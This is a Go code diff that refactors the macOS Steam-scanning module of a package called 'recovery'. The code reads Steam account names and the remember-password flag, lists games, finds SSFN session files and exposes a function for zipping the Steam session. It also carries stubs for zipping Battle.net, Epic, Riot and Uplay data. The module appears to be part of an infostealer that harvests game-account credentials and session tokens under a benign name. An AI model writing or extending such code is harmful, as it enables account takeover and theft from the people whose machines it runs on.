@@ -1,11 +1,10 @@
-//go:build !windows
+//go:build darwin
 
 package recovery
 
 import (
 	"os"
 	"path/filepath"
-	"runtime"
 	"strings"
 
 	"recovery/recovery/types"
@@ -18,38 +17,24 @@ func pathExists(path string) bool {
 }
 
 func ScanGaming() *types.GamingResult {
-	result := &types.GamingResult{
-		Steam: scanSteamUnix(),
-	}
+	result := &types.GamingResult{Steam: scanSteam()}
 	if result.Steam == nil {
 		return nil
 	}
 	return result
 }
 
-func steamBasePaths() []string {
+func steamBasePath() string {
 	home, _ := os.UserHomeDir()
-	if runtime.GOOS == "darwin" {
-		return []string{
-			filepath.Join(home, "Library", "Application Support", "Steam"),
-		}
+	if home == "" {
+		return ""
 	}
-	return []string{
-		filepath.Join(home, ".steam", "steam"),
-		filepath.Join(home, ".local", "share", "Steam"),
-		filepath.Join(home, ".steam", "debian-installation"),
-	}
+	return filepath.Join(home, "Library", "Application Support", "Steam")
 }
 
-func scanSteamUnix() *types.SteamResult {
-	var steamPath string
-	for _, p := range steamBasePaths() {
-		if pathExists(p) {
-			steamPath = p
-			break
-		}
-	}
-	if steamPath == "" {
+func scanSteam() *types.SteamResult {
+	steamPath := steamBasePath()
+	if steamPath == "" || !pathExists(steamPath) {
 		return nil
 	}
 
@@ -60,14 +45,14 @@ func scanSteamUnix() *types.SteamResult {
 		for _, line := range strings.Split(string(data), "\n") {
 			line = strings.TrimSpace(line)
 			if strings.HasPrefix(line, `"AccountName"`) || strings.HasPrefix(line, `"accountname"`) {
-				val := vdfValueUnix(line)
+				val := vdfValue(line)
 				if val != "" {
 					result.Account = val
 					result.AutoLogin = val
 				}
 			}
 			if strings.HasPrefix(line, `"RememberPassword"`) {
-				result.RememberPW = vdfValueUnix(line) == "1"
+				result.RememberPW = vdfValue(line) == "1"
 			}
 		}
 	}
@@ -81,7 +66,7 @@ func scanSteamUnix() *types.SteamResult {
 	}
 
 	seenGames := make(map[string]bool)
-	scanSteamLibraryUnix(steamPath, result, seenGames)
+	scanSteamLibrary(steamPath, result, seenGames)
 
 	if result.Account == "" && len(result.Games) == 0 && len(result.SSFNFiles) == 0 {
 		return nil
@@ -89,7 +74,7 @@ func scanSteamUnix() *types.SteamResult {
 	return result
 }
 
-func scanSteamLibraryUnix(steamPath string, result *types.SteamResult, seenGames map[string]bool) {
+func scanSteamLibrary(steamPath string, result *types.SteamResult, seenGames map[string]bool) {
 	libraryFolders := []string{steamPath}
 
 	steamappsRoot := filepath.Join(steamPath, "steamapps")
@@ -98,7 +83,7 @@ func scanSteamLibraryUnix(steamPath string, result *types.SteamResult, seenGames
 		for _, line := range strings.Split(string(data), "\n") {
 			line = strings.TrimSpace(line)
 			if strings.HasPrefix(strings.ToLower(line), `"path"`) {
-				val := vdfValueUnix(line)
+				val := vdfValue(line)
 				if val != "" && pathExists(val) && val != steamPath {
 					libraryFolders = append(libraryFolders, val)
 				}
@@ -120,7 +105,7 @@ func scanSteamLibraryUnix(steamPath string, result *types.SteamResult, seenGames
 			if err != nil || len(acfData) == 0 {
 				continue
 			}
-			acf := parseACFUnix(string(acfData))
+			acf := parseACF(string(acfData))
 			if acf["appid"] == "" || acf["name"] == "" {
 				continue
 			}
@@ -136,7 +121,7 @@ func scanSteamLibraryUnix(steamPath string, result *types.SteamResult, seenGames
 	}
 }
 
-func parseACFUnix(data string) map[string]string {
+func parseACF(data string) map[string]string {
 	result := map[string]string{}
 	var inBlock bool
 	for _, line := range strings.Split(data, "\n") {
@@ -152,8 +137,8 @@ func parseACFUnix(data string) map[string]string {
 			continue
 		}
 		if strings.HasPrefix(line, `"`) {
-			key := vdfNthQuotedUnix(line, 0)
-			val := vdfNthQuotedUnix(line, 1)
+			key := vdfNthQuoted(line, 0)
+			val := vdfNthQuoted(line, 1)
 			if key != "" {
 				result[key] = val
 			}
@@ -162,11 +147,11 @@ func parseACFUnix(data string) map[string]string {
 	return result
 }
 
-func vdfValueUnix(line string) string {
-	return vdfNthQuotedUnix(line, 1)
+func vdfValue(line string) string {
+	return vdfNthQuoted(line, 1)
 }
 
-func vdfNthQuotedUnix(line string, n int) string {
+func vdfNthQuoted(line string, n int) string {
 	count := 0
 	i := 0
 	for count <= n && i < len(line) {
@@ -224,5 +209,5 @@ func ZipSteamSession(steamPath string) ([]byte, error) {
 
 func ZipBattleNet() ([]byte, error) { return nil, os.ErrNotExist }
 func ZipEpic() ([]byte, error)      { return nil, os.ErrNotExist }
-func ZipRiot() ([]byte, error)       { return nil, os.ErrNotExist }
-func ZipUplay() ([]byte, error)      { return nil, os.ErrNotExist }
+func ZipRiot() ([]byte, error)      { return nil, os.ErrNotExist }
+func ZipUplay() ([]byte, error)     { return nil, os.ErrNotExist }
